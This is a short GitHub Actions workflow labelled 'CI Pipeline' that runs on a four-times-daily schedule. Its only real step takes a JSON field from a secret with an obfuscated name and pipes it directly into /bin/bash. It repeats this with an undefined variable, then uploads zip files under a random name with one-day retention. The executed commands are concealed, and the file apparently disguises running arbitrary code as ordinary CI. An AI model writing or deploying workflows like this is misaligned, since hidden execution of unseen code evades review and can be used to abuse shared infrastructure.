name: CI Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '27 4,10,16,22 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          i3699: ${{ secrets.i3699 }}
        run: |
          printf '%s' "$i3699" | jq -r .zzhp2298 | /bin/bash
          echo $p8 | jq -r .znaz27739 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: KzSSB0n1
          path: "*.zip"
          retention-days: 1
